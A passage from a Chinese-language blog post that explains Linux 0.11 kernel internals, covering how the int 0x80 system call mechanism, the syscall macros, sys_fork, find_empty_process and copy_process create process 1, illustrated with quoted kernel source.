class="line">&#123; \</span><br><span class="line">long __res; \</span><br><span class="line">__asm__ volatile (&quot;int $0x80&quot; \</span><br><span class="line">    : &quot;&#x3D;a&quot; (__res) \</span><br><span class="line">    : &quot;0&quot; (__NR_##name)); \</span><br><span class="line">if (__res &gt;&#x3D; 0) \</span><br><span class="line">    return (type) __res; \</span><br><span class="line">errno &#x3D; -__res; \</span><br><span class="line">return -1; \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 把它转换成稍微能看得懂的样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#define _syscall0(type,name) \</span><br><span class="line">type name(void) \</span><br><span class="line">&#123; \</span><br><span class="line">    volatile long __res; \</span><br><span class="line">    _asm &#123; \</span><br><span class="line">        _asm mov eax,__NR_##name \</span><br><span class="line">        _asm int 80h \</span><br><span class="line">        _asm mov __res,eax \</span><br><span class="line">    &#125; \</span><br><span class="line">    if (__res &gt;&#x3D; 0) \</span><br><span class="line">        return (type) __res; \</span><br><span class="line">    errno &#x3D; -__res; \</span><br><span class="line">    return -1; \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把宏定义都展开，其实就相当于<strong>定义了一个函数</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int fork(void) &#123;</span><br><span class="line">     volatile long __res;</span><br><span class="line">    _asm &#123;</span><br><span class="line">        _asm mov eax,__NR_fork</span><br><span class="line">        _asm int 80h</span><br><span class="line">        _asm mov __res,eax</span><br><span class="line">    &#125;</span><br><span class="line">    if (__res &gt;&#x3D; 0)</span><br><span class="line">        return (void) __res;</span><br><span class="line">    errno &#x3D; -__res;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内敛汇编看不懂，关注结果就行</p><p>最关键的是这里触发了 int 0x80 的系统调用，eax 参数是 __NR_fork，值为 2 </p><p>之前在 <strong>sched_init</strong> 有定义 int 0x80 的系统中断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_system_gate(0x80, &amp;system_call);</span><br></pre></td></tr></table></figure><p>再看看 system_call </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;kernel&#x2F;system_call.s</span><br><span class="line">_system_call:</span><br><span class="line">    ...</span><br><span class="line">    call [_sys_call_table + eax*4]</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>eax 被赋值为 2 ，也就是找到 <strong>sys_call_table</strong> 里下标为 2 的函数，然后跳过去。</p><p>接着看 sys_call_table 有啥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;include&#x2F;linux&#x2F;sys.h</span><br><span class="line">fn_ptr sys_call_table[] &#x3D; &#123; sys_setup, sys_exit, sys_fork, sys_read,</span><br><span class="line">  sys_write, sys_open, sys_close, sys_waitpid, sys_creat, sys_link,</span><br><span class="line">  sys_unlink, sys_execve, sys_chdir, sys_time, sys_mknod, sys_chmod,</span><br><span class="line">  sys_chown, sys_break, sys_stat, sys_lseek, sys_getpid, sys_mount,</span><br><span class="line">  sys_umount, sys_setuid, sys_getuid, sys_stime, sys_ptrace, sys_alarm,</span><br><span class="line">  sys_fstat, sys_pause, sys_utime, sys_stty, sys_gtty, sys_access,</span><br><span class="line">  sys_nice, sys_ftime, sys_sync, sys_kill, sys_rename, sys_mkdir,</span><br><span class="line">  sys_rmdir, sys_dup, sys_pipe, sys_times, sys_prof, sys_brk, sys_setgid,</span><br><span class="line">  sys_getgid, sys_signal, sys_geteuid, sys_getegid, sys_acct, sys_phys,</span><br><span class="line">  sys_lock, sys_ioctl, sys_fcntl, sys_mpx, sys_setpgid, sys_ulimit,</span><br><span class="line">  sys_uname, sys_umask, sys_chroot, sys_ustat, sys_dup2, sys_getppid,</span><br><span class="line">  sys_getpgrp, sys_setsid, sys_sigaction, sys_sgetmask, sys_ssetmask,</span><br><span class="line">  sys_setreuid, sys_setregid</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到第二项对应的就是 sys_fork，这也印证了为啥做 pwn 题时要把 eax 改成对应的值就能调用对应的函数，是为了去 sys_call_table[] 里找下标，然后对应函数。</p><p>收回，再看看 sys_fork，具体干了啥，之后再讲</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;kernel&#x2F;system_call.s</span><br><span class="line">_sys_fork:</span><br><span class="line">    call _find_empty_process</span><br><span class="line">    testl %eax,%eax</span><br><span class="line">    js 1f</span><br><span class="line">    push %gs</span><br><span class="line">    pushl %esi</span><br><span class="line">    pushl %edi</span><br><span class="line">    pushl %ebp</span><br><span class="line">    pushl %eax</span><br><span class="line">    call _copy_process</span><br><span class="line">    addl $20,%esp</span><br><span class="line">1:  ret</span><br></pre></td></tr></table></figure><hr><p>再补充一些，刚刚定义 fork 函数的系统调用模板函数中，用的是 <strong>syscall0</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">static _inline _syscall0(int,fork)</span><br><span class="line"></span><br><span class="line">#define _syscall0(type,name) \</span><br><span class="line">type name(void) \</span><br><span class="line">&#123; \</span><br><span class="line">long __res; \</span><br><span class="line">__asm__ volatile (&quot;int $0x80&quot; \</span><br><span class="line">    : &quot;&#x3D;a&quot; (__res) \</span><br><span class="line">    : &quot;0&quot; (__NR_##name)); \</span><br><span class="line">if (__res &gt;&#x3D; 0) \</span><br><span class="line">    return (type) __res; \</span><br><span class="line">errno &#x3D; -__res; \</span><br><span class="line">return -1; \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 0 其实表示的就是参数的个数，也就是 sys_fork 函数是不需要任何参数的。</p><p>可以在<code>/include/unistd.h</code>中找到定义，简化如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define _syscall0(type,name)</span><br><span class="line">#define _syscall1(type,name,atype,a)</span><br><span class="line">#define _syscall2(type,name,atype,a,btype,b)</span><br><span class="line">#define _syscall3(type,name,atype,a,btype,b,ctype,c)</span><br></pre></td></tr></table></figure><p>这些参数会放在哪里呢？</p><p>答案是 <strong>execve</strong>，在之后创建进程 1 和进程 2 的过程中，execve 都会和 fork 函数一起出现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (!(pid=fork())) &#123;</span><br><span class="line">        ...</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh&quot;</span>,argv_rc,envp_rc);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们再来细看一下 syscall3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,argv_rc,envp_rc);</span><br><span class="line"></span><br><span class="line">_syscall3(int,execve,const char *,file,char **,argv,char **,envp)</span><br><span class="line"></span><br><span class="line">#define _syscall3(type,name,atype,a,btype,b,ctype,c) \</span><br><span class="line">type name(atype a,btype b,ctype c) &#123; \</span><br><span class="line">    volatile long __res; \</span><br><span class="line">    _asm &#123; \</span><br><span class="line">        _asm mov eax,__NR_##name \</span><br><span class="line">        _asm mov ebx,a \</span><br><span class="line">        _asm mov ecx,b \</span><br><span class="line">        _asm mov edx,c \</span><br><span class="line">        _asm int 80h \</span><br><span class="line">        _asm mov __res,eax\</span><br><span class="line">    &#125; \</span><br><span class="line">    if (__res &gt;&#x3D; 0) \</span><br><span class="line">        return (type) __res; \</span><br><span class="line">    errno &#x3D; -__res; \</span><br><span class="line">    return -1; \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，a 放入了 ebx，b 放入了 ecx，c 放入了 edx。</p><p>再细看一下 system_call</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_system_call:</span><br><span class="line">    cmpl $nr_system_calls-1,%eax</span><br><span class="line">    ja bad_sys_call</span><br><span class="line">    push %ds</span><br><span class="line">    push %es</span><br><span class="line">    push %fs</span><br><span class="line">    pushl %edx</span><br><span class="line">    pushl %ecx      # push %ebx,%ecx,%edx as parameters</span><br><span class="line">    pushl %ebx      # to the system call</span><br><span class="line">    movl $0x10,%edx     # set up ds,es to kernel space</span><br><span class="line">    mov %dx,%ds</span><br><span class="line">    mov %dx,%es</span><br><span class="line">    movl $0x17,%edx     # fs points to local data space</span><br><span class="line">    mov %dx,%fs</span><br><span class="line">    call _sys_call_table(,%eax,4)</span><br><span class="line">    pushl %eax</span><br><span class="line">    movl _current,%eax</span><br><span class="line">    cmpl $0,state(%eax)     # state</span><br><span class="line">    jne reschedule</span><br><span class="line">    cmpl $0,counter(%eax)       # counter</span><br><span class="line">    je reschedule</span><br><span class="line">ret_from_sys_call:</span><br><span class="line">    movl _current,%eax      # task[0] cannot have signals</span><br><span class="line">    cmpl _task,%eax</span><br><span class="line">    je 3f</span><br><span class="line">    cmpw $0x0f,CS(%esp)     # was old code segment supervisor ?</span><br><span class="line">    jne 3f</span><br><span class="line">    cmpw $0x17,OLDSS(%esp)      # was stack segment &#x3D; 0x17 ?</span><br><span class="line">    jne 3f</span><br><span class="line">    movl signal(%eax),%ebx</span><br><span class="line">    movl blocked(%eax),%ecx</span><br><span class="line">    notl %ecx</span><br><span class="line">    andl %ebx,%ecx</span><br><span class="line">    bsfl %ecx,%ecx</span><br><span class="line">    je 3f</span><br><span class="line">    btrl %ecx,%ebx</span><br><span class="line">    movl %ebx,signal(%eax)</span><br><span class="line">    incl %ecx</span><br><span class="line">    pushl %ecx</span><br><span class="line">    call _do_signal</span><br><span class="line">    popl %eax</span><br><span class="line">3:  popl %eax</span><br><span class="line">    popl %ebx</span><br><span class="line">    popl %ecx</span><br><span class="line">    popl %edx</span><br><span class="line">    pop %fs</span><br><span class="line">    pop %es</span><br><span class="line">    pop %ds</span><br><span class="line">    iret</span><br></pre></td></tr></table></figure><p>我们只关注压栈的情况，之前有说过，触发中断时，CPU 会往栈中压入一些数据</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648693401023671/03fd28ed3881c1b332090ae726b95eb255f533e6.png" alt="640"></p><p>system_call 是通过 int 0x80 这个软中断实现的，属于特权级发生变化，且没有错误码情况的中断，所以栈会被提前压入 <strong>SS、ESP、EFLAGS、CS、EIP</strong>。</p><p>之后 system_call 函数本身也会压入一些值，<strong>ds、es、fs、edx、ecx、ebx、eax</strong>。</p><p>现在来看一下栈中寄存器的位置，作者也很贴心的给出了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * Stack layout in &#39;ret_from_system_call&#39;:</span><br><span class="line"> *</span><br><span class="line"> *   0(%esp) - %eax</span><br><span class="line"> *   4(%esp) - %ebx</span><br><span class="line"> *   8(%esp) - %ecx</span><br><span class="line"> *   C(%esp) - %edx</span><br><span class="line"> *  10(%esp) - %fs</span><br><span class="line"> *  14(%esp) - %es</span><br><span class="line"> *  18(%esp) - %ds</span><br><span class="line"> *  1C(%esp) - %eip</span><br><span class="line"> *  20(%esp) - %cs</span><br><span class="line"> *  24(%esp) - %eflags</span><br><span class="line"> *  28(%esp) - %oldesp</span><br><span class="line"> *  2C(%esp) - %oldss</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure><p>之后，中断处理程序如果有需要，就可以从这里取出它想要的值。</p><p>比如 <strong>sys_execve</strong> 这个中断处理程序，就取走了位于 0x1c 处的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EIP &#x3D; 0x1C</span><br><span class="line">_sys_execve:</span><br><span class="line">    lea EIP(%esp),%eax</span><br><span class="line">    pushl %eax</span><br><span class="line">    call _do_execve</span><br><span class="line">    addl $4,%esp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>之后的 <strong>do_execve</strong> 函数，又取走了 <strong>filename，argv，envp</strong> 等参数，这个之后再说。</p><hr><p><strong>总结：最重要的是调用了 int 0x80 的系统调用，将 eax 赋成特定的值，就能调用特定的函数</strong></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648869110129721/ced2ad2a82fbc6d6463ec5868f15744219039a1d.png" alt="640"></p><h4 id="sys-fork"><a href="#sys-fork" class="headerlink" title="sys_fork()"></a>sys_fork()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#&#x2F;kernel&#x2F;sysctem_call.s</span><br><span class="line">_sys_fork:</span><br><span class="line">    call _find_empty_process</span><br><span class="line">    testl %eax,%eax</span><br><span class="line">    js 1f</span><br><span class="line">    push %gs</span><br><span class="line">    pushl %esi</span><br><span class="line">    pushl %edi</span><br><span class="line">    pushl %ebp</span><br><span class="line">    pushl %eax</span><br><span class="line">    call _copy_process</span><br><span class="line">    addl $20,%esp</span><br><span class="line">1:  ret</span><br></pre></td></tr></table></figure><p>调用了两个函数：find_empty_process、copy_process</p><h5 id="find-empty-process"><a href="#find-empty-process" class="headerlink" title="find_empty_process"></a>find_empty_process</h5><p>之前有说过，进程是以 <strong>task_struct</strong> 的结构存储在数组 <strong>task[64]</strong> 中</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648448883390142/33cef6c48ae10c3e9e402b9cb81584b292f54551.png" alt="640 (2)"></p><p>这个函数就是为了找到空闲的进程槽位，然后在槽位准备存一个新的进程的结构 <strong>task_struct</strong></p><p>来具体看看代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#/kernel/fork.c</span><br><span class="line"><span class="keyword">long</span> last_pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_empty_process</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    repeat:</span><br><span class="line">        <span class="keyword">if</span> ((++last_pid)&lt;<span class="number">0</span>) last_pid=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ; i&lt;<span class="number">64</span> ; i++)</span><br><span class="line">            <span class="keyword">if</span> (task[i] &amp;&amp; task[i]-&gt;pid == last_pid) <span class="keyword">goto</span> repeat;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span> ; i&lt;<span class="number">64</span>; i++)  <span class="comment">//进程0排除</span></span><br><span class="line">        <span class="keyword">if</span> (!task[i])</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很清楚了，首先判断 last_pid +1 是否小于0，小于 0 说明超出了进程号的整数表示范围，并重新赋值为 1；第一个 for 循环遍历整个进程数组，判断 last_pid 是否被占用，被占用了就回去重新找下一个，没被占用就返回这个进程号；下一个 for 循环，再次遍历找到这个 task 中的空闲项并返回。</p><p>最终，这个函数会返回 <strong>task[] 数组的索引，表示找到了一个空闲项</strong>，并在里面加入新进程。</p><p>由于我们现在只有 0 号进程，且 task[] 除了 0 号索引位置，其他地方都是空的，所以这个函数运行完，<strong>last_pid 就是 1，也就是新进程被分配的 pid 就是 1，即将要加入的 task[] 数组的索引位置，也是 1。</strong></p><p>怎么构造新的进程结构，并塞入 task[1] 中呢？就要看下一个函数了</p><h5 id="copy-process"><a href="#copy-process" class="headerlink" title="copy_process"></a>copy_process</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#/kernel/fork.c</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_process</span><span class="params">(<span class="keyword">int</span> nr,<span class="keyword">long</span> ebp,<span class="keyword">long</span> edi,<span class="keyword">long</span> esi,<span class="keyword">long</span> gs,<span class="keyword">long</span> none,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">long</span> ebx,<span class="keyword">long</span> ecx,<span class="keyword">long</span> edx,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">long</span> fs,<span class="keyword">long</span> es,<span class="keyword">long</span> ds,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">long</span> eip,<span class="keyword">long</span> cs,<span class="keyword">long</span> eflags,<span class="keyword">long</span> esp,<span class="keyword">long</span> ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p = (struct task_struct *) get_free_page();</span><br><span class="line">    <span class="keyword">if</span> (!p)</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    task[nr] = p;</span><br><span class="line">    *p = *current;  <span class="comment">/* NOTE! this doesn&#x27;t copy the supervisor stack */</span></span><br><span class="line">    p-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">    p-&gt;pid = last_pid;</span><br><span class="line">    p-&gt;father = current-&gt;pid;</span><br><span class="line">    p-&gt;counter = p-&gt;priority;</span><br><span class="line">    p-&gt;signal = <span class="number">0</span>;</span><br><span class="line">    p-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">    p-&gt;leader = <span class="number">0</span>;      <span class="comment">/* process leadership doesn&#x27;t inherit */</span></span><br><span class="line">    p-&gt;utime = p-&gt;stime = <span class="number">0</span>;</span><br><span class="line">    p-&gt;cutime = p-&gt;cstime = <span class="number">0</span>;</span><br><span class="line">    p-&gt;start_time = jiffies;</span><br><span class="line">    p-&gt;tss.back_link = <span class="number">0</span>;</span><br><span class="line">    p-&gt;tss.esp0 = PAGE_SIZE + (<span class="keyword">long</span>) p;</span><br><span class="line">    p-&gt;tss.ss0 = <span class="number">0x10</span>;</span><br><span class="line">    p-&gt;tss.eip = eip;</span><br><span class="line">    p-&gt;tss.eflags = eflags;</span><br><span class="line">    p-&gt;tss.eax = <span class="number">0</span>;</span><br><span class="line">    p-&gt;tss.ecx = ecx;</span><br><span class="line">    p-&gt;tss.edx = edx;</span><br><span class="line">    p-&gt;tss.ebx = ebx;</span><br><span class="line">    p-&gt;tss.esp = esp;</span><br><span class="line">    p-&gt;tss.ebp = ebp;</span><br><span class="line">    p-&gt;tss.esi = esi;</span><br><span class="line">    p-&gt;tss.edi = edi;</span><br><span class="line">    p-&gt;tss.es = es &amp; <span class="number">0xffff</span>;</span><br><span class="line">    p-&gt;tss.cs = cs &amp; <span class="number">0xffff</span>;</span><br><span class="line">    p-&gt;tss.ss = ss &amp; <span class="number">0xffff</span>;</span><br><span class="line">    p-&gt;tss.ds = ds &amp; <span class="number">0xffff</span>;</span><br><span class="line">    p-&gt;tss.fs = fs &amp; <span class="number">0xffff</span>;</span><br><span class="line">    p-&gt;tss.gs = gs &amp; <span class="number">0xffff</span>;</span><br><span class="line">    p-&gt;tss.ldt = _LDT(nr);</span><br><span class="line">    p-&gt;tss.trace_bitmap = <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">if</span> (last_task_used_math == current)</span><br><span class="line">        __asm__(<span class="string">&quot;clts ; fnsave %0&quot;</span>::<span class="string">&quot;m&quot;</span> (p-&gt;tss.i387));</span><br><span class="line">    <span class="keyword">if</span> (copy_mem(nr,p)) &#123;</span><br><span class="line">        task[nr] = <span class="literal">NULL</span>;</span><br><span class="line">        free_page((<span class="keyword">long</span>) p);</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;NR_OPEN;i++)</span><br><span class="line">        <span class="keyword">if</span> (f=p-&gt;filp[i])</span><br><span class="line">            f-&gt;f_count++;</span><br><span class="line">    <span class="keyword">if</span> (current-&gt;pwd)</span><br><span class="line">        current-&gt;pwd-&gt;i_count++;</span><br><span class="line">    <span class="keyword">if</span> (current-&gt;root)</span><br><span class="line">        current-&gt;root-&gt;i_count++;</span><br><span class="line">    <span class="keyword">if</span> (current-&gt;executable)</span><br><span class="line">        current-&gt;executable-&gt;i_count++;</span><br><span class="line">    set_tss_desc(gdt+(nr&lt;&lt;<span class="number">1</span>)+FIRST_TSS_ENTRY,&amp;(p-&gt;tss));</span><br><span class="line">    set_ldt_desc(gdt+(nr&lt;&lt;<span class="number">1</span>)+FIRST_LDT_ENTRY,&amp;(p-&gt;ldt));</span><br><span class="line">    p-&gt;state = TASK_RUNNING;    <span class="comment">/* do this last, just in case */</span></span><br><span class="line">    <span class="keyword">return</span> last_pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前说过，在内存初始化时，mem_init 会用一个 mem_map[] 数组来记录内存的使用次数</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1647998568100717/6f87e9989e63b9e4439b63967df034230bf26555.png" alt="640"></p><p>首先 get_free_page 会在主内存申请一个空闲页面，就是遍历 mem_map[] 这个数组，找出值为 0 的项，就表示找到了空闲的一页内存。然后把该项置为 1，表示该页已经被使用一次。最后，算出这个页的内存起始地址，返回给 task_struct 结构的 p 。</p><p>这样，一个新的进程就有了属于自己的内存空间。</p><p>然后会把这个 p 放入进程管理结构 task[] 中。</p><p><code>*p = *current</code>，<strong>就是把当前进程，也就是 0 号进程的 task_struct 的全部值都复制给即将创建的进程 p</strong>，目前它们两者就完全一样了。</p><p>最后内存的布局效果就是这样：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-3/1648950992137847/36d135e49cbd0845e5fc658b09355deb60dc3f61.png" alt="640"></p><p>现在进程 1 和进程 0 是完全复制的状态，但后面的赋值操作是将一些值个性化处理，这里列举一部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_process</span><span class="params">(<span class="keyword">int</span> nr, ...)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    p-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">    p-&gt;pid = last_pid;</span><br><span class="line">    p-&gt;counter = p-&gt;priority;</span><br><span class="line">    ..</span><br><span class="line">    p-&gt;tss.edx = edx;</span><br><span class="line">    p-&gt;tss.ebx = ebx;</span><br><span class="line">    p-&gt;tss.esp = esp;</span><br><span class="line">    ...</span><br><span class="line">    p-&gt;tss.esp0 = PAGE_SIZE + (<span class="keyword">long</span>) p;</span><br><span class="line">    p-&gt;tss.ss0 = <span class="number">0x10</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不一样的值，一部分是 <strong>state</strong>，<strong>pid</strong>，<strong>counter</strong> 这种<strong>进程的元信息</strong>，另一部分是 <strong>tss</strong> 